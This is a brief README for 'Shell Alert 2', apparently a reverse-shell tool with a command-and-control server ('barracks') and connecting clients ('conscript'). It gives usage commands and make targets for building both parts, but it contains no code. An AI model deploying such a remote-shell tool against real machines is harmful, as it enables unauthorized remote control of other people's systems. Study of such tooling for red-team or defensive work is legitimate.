# Shell Alert 2

Based of the work done by [adedayo](https://github.com/adedayo/reverse-shell).

## Usage

server (`barracks`)

```bash
barracks <port to listen on>
```

client (`conscript`)

```bash
conscript <ip/hostname of barracks> <port of barracks>
```

## Build

Build C&C servers to `./bin/buildings` 

```
make buildings
```

Build clients to `./bin/units` 

```
make units
```

Build everything

```
make all
```
